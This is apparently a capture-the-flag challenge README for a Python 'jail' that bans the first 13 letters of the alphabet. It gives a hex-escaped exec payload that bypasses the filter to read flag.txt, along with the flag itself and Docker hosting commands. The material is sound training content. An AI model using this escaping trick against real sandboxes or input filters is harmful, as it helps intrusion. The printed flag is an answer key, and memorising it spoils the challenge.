# ABCDEFGHIJKLM
Level - Medium

Description:
```
You can't use any of the first 13 letters of the alphabet EXCEPT for the first 4 letters of your input

OH and don't make it too long

nc byuctf.xyz 40003

[abcdefghijklm.py]
```

## Writeup
The following solution works - `exec("pr\x69nt(op\x65n('\x66'+\x63\x68r(108)+'\x61\x67.txt').r\x65\x61\x64())")`

**Flag** - `byuctf{enc0dings_4r3_us3d_f0r_jailz}`

## Hosting
This challenge should be a Docker container that runs the Python script `abcdefghijklm.py` every time someone connects on port 40003. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
sudo docker build -t abcdefghijklm .
sudo docker network create -d bridge abcdefghijklm
```

The command to start the challenge is:

```bash
sudo docker run -p 40003:40000 --detach --name abcdefghijklm --network abcdefghijklm abcdefghijklm:latest
```

The command to stop the challenge (since CTRL+C won't work) is:

```bash
sudo docker stop abcdefghijklm
```